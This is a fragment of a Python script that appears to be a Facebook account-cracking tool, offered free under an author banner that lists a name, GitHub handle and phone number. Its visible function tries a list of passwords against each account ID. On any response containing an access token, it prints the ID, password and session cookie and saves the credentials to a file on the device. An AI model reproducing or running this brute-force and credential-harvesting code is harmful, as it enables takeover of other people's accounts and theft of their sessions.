...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38m[SHIMUL-BRO ]\33[1;38m  ║\033[1;31m 
╠══[Facebook                 • Md Shimul Sha  ║  \033[1;97m  
╠══[Github                   • \33[ 4KING1          ║\33[1;34m   
╠══[Whatsapp                 • +8801725280174 ║\33[1;35m 
╠══[TOOLS                    • [FREE ]        ║ \33[1;32m   
...
def api(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\x1b[38;5;155m[➤] 4KING1~FINDING  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\x1b[38;5;84m[4KING1-LIVE] '+ids+' ~~ '+pas+'\x1b[38;5;155m')
                print('\033[1;92m[COOKIE] : ➤ : '+kuki+'\x1b[38;5;223m');linex()
                oks.append(ids)
                open('/sdcard/4KING1-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
